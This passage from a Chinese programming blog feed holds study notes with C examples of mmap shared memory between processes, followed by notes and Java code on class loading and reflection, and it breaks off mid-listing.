class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> var = <span class="number">100</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> *p;</span><br><span class="line"><span class="keyword">pid_t</span> pid;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"temp"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open err"</span>);</span><br><span class="line"></span><br><span class="line">ftruncate(fd,<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">p = (<span class="keyword">int</span> *)mmap(<span class="literal">NULL</span>,<span class="number">4</span>,PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)&#123;</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(fd); <span class="comment">//映射区建立完毕，即可关闭文件</span></span><br><span class="line"></span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid==<span class="number">0</span>)&#123;</span><br><span class="line">*p = <span class="number">2000</span>; <span class="comment">//写共享内存</span></span><br><span class="line">var = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"child,*p = %d,var = %d\n"</span>,*p,var); <span class="comment">//读共享内存</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"parent,*p = %d,var = %d\n"</span>,*p,var);</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret = munmap(p,<span class="number">4</span>); <span class="comment">//释放映射区</span></span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"munmap error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="非血缘关系进程间通信"><a href="#非血缘关系进程间通信" class="headerlink" title="非血缘关系进程间通信"></a>非血缘关系进程间通信</h5><p>代码练习，两个进程，一个对结构体进行修改后写入，另一个进程对写入后的结构体进行读取</p><p>第一个文件是写入文件的代码<code>mmap_w.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span> = &#123;</span><span class="number">1</span>,<span class="string">"elssm"</span>,<span class="number">22</span>&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"test_map"</span>,O_RDWR|O_CREAT|O_TRUNC,<span class="number">0644</span>);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">ftruncate(fd,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">p = mmap(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(stu),PROT_READ|PROT_WRITE,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">memcpy</span>(p,&amp;stu,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">stu.id++;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">munmap(p,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二个文件是读取文件的代码<code>mmap_r.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> id;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">256</span>];</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> <span class="title">stu</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">student</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line">fd = open(<span class="string">"test_map"</span>,O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">p = mmap(<span class="literal">NULL</span>,<span class="keyword">sizeof</span>(stu),PROT_READ,MAP_SHARED,fd,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(p == MAP_FAILED)</span><br><span class="line">sys_err(<span class="string">"mmap error"</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"id = %d,name = %s,age = %d\n"</span>,p-&gt;id,p-&gt;name,p-&gt;age);</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">munmap(p,<span class="keyword">sizeof</span>(stu));</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;进程和程序&quot;&gt;&lt;a href=&quot;#进程和程序&quot; class=&quot;headerlink&quot; title=&quot;进程和程序&quot;&gt;&lt;/a&gt;进程和程序&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;程序：只占用磁盘空间&lt;/li&gt;
&lt;li&gt;进程：运行起来的程序，占用内存、CPU等系统资源&lt;/li&gt;
&lt;/
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="elssm.github.io/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Java反射学习</title>
    <link href="elssm.github.io/2021/09/30/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/09/30/Java反射学习/</id>
    <published>2021-09-30T12:41:53.000Z</published>
    <updated>2021-09-30T12:43:42.823Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h4><p>当程序要使用某个类时，如果该类还未被加载到内存中，则系统会通过加载，连接，初始化三步来实现对这个类进行初始化。</p><ul><li>加载：将class文件读入内存，并为之创建一个Class对象。任何类被使用时系统都会建立一个Class对象。</li><li>连接<ul><li>验证：是否有正确的内部结构，并和其他类协调一致</li><li>准备：负责为类的静态成员分配内存，并设置默认初始化值</li><li>解析：将类的二进制数据中的符号引用替换为直接引用</li></ul></li><li>初始化：执行类构造器<code>&lt;clinit&gt;()</code>方法的过程。</li></ul><h4 id="类初始化时机"><a href="#类初始化时机" class="headerlink" title="类初始化时机"></a>类初始化时机</h4><ul><li>创建类的实例</li><li>访问类的静态变量，或者为静态变量赋值</li><li>调用类的静态方法</li><li>使用反射方式来强制创建某个类或接口对应的<code>java.lang.Class</code>对象</li><li>初始化某个类的子类</li><li>直接使用<code>java.exe</code>命令来运行某个主类</li></ul><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>负责将<code>.class</code>文件加载到内存中，并为之生成对应的Class对象</p><p>类加载器的组成</p><ul><li>Bootstrap ClassLoader 根类加载器<ul><li>也被称为引导类加载器，负责Java核心类的加载，例如<code>System.String</code>等</li></ul></li><li>Extension ClassLoader 扩展类加载器<ul><li>负责JRE的扩展目录中jar包的加载</li></ul></li><li>System ClassLoader 系统类加载器<ul><li>负责在JVM启动时加载来自java命令的class文件，以及classpath环境变量所指定的jar包和类路径</li></ul></li></ul><h4 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h4><p>Java反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性。</p><p>要想解剖一个类，必须先要获取到该类的字节码文件对象，而解剖使用的就是Class类中的方法，所有先要获取到每一个字节码文件对应的Class类型的对象。</p><h4 id="为什么需要反射？"><a href="#为什么需要反射？" class="headerlink" title="为什么需要反射？"></a>为什么需要反射？</h4><p>反射赋予了JVM动态编译的能力，动态编译可以最大限度的体现Java的灵活性，否则类的元信息只能通过静态编译的形式实现，而不能动态编译，也就是说在编译以后，程序在运行时的行为就是固定的了，如果要在运行时改变程序的行为，就需要动态编译，因此在Java中就需要反射来实现。</p><p>反射举例</p><p>首先实现一个<code>Person</code>类，在<code>Person</code>类中有成员变量，构造函数，和成员方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Person (String name,<span class="keyword">int</span> age) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name,<span class="keyword">int</span> age,String address)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.address = address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"show"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"method"</span> + s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getString</span><span class="params">(String s,<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> s + <span class="string">"---"</span> + i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"function"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Person&#123;"</span> +</span><br><span class="line">                <span class="string">"name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", age="</span> + age +</span><br><span class="line">                <span class="string">", address='"</span> + address + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取到字节码文件对象的三种方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Class c1 = p.getClass();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c2 = Person<span class="class">.<span class="keyword">class</span>()</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class c3 = Class.forName(<span class="string">"refTest.Person"</span>);</span><br></pre></td></tr></table></figure><p>通过反射获取公共有参构造方法并实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.jxc.ap.Const;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line">        Constructor con = c.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        Object obj = con.newInstance(<span class="string">"elssm"</span>,<span class="number">22</span>,<span class="string">"西安"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取私有构造方法并实例化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.internal.jxc.ap.Const;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line">      <span class="comment">//获取私有的有参构造方法对象</span></span><br><span class="line">        Constructor con = c.getDeclaredConstructor(String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line"></span><br><span class="line">        con.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = con.newInstance(<span class="string">"elssm"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取所有的成员变量</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest1;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取所有的成员变量</span></span><br><span class="line">        Field[] fields = c.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Field field:fields) &#123;</span><br><span class="line">            System.out.println(field);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取成员变量类型并使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//获取字节码文件对象</span></span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过无参构造方法创建对象</span></span><br><span class="line">        Constructor con = c.getConstructor();</span><br><span class="line">        Object obj = con.newInstance();</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取单个成员变量</span></span><br><span class="line">        Field addressField = c.getField(<span class="string">"address"</span>);</span><br><span class="line">        addressField.set(obj,<span class="string">"西安"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取name并对其赋值</span></span><br><span class="line">        Field nameField = c.getDeclaredField(<span class="string">"name"</span>);</span><br><span class="line">        nameField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        nameField.set(obj,<span class="string">"elssm"</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取age并对其赋值</span></span><br><span class="line">        Field ageField = c.getDeclaredField(<span class="string">"age"</span>);</span><br><span class="line">        ageField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ageField.set(obj,<span class="number">22</span>);</span><br><span class="line">        System.out.println(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取所有的成员方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> refTest2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ReflectDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class c = Class.forName(<span class="string">"refTest.Person"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//      Method[] methods = c.getMethods(); //获取自己的包括父亲的公共方法</span></span><br><span class="line">        Method[] methods = c.getDeclaredMethods(); <span class="comment">//获取自己的所有的方法</span></span><br><span class="line">        <span class="keyword">for</span> (Method method:methods)&#123;</span><br><span class="line">            System.out.println(method);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射获取单个成员方法并使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 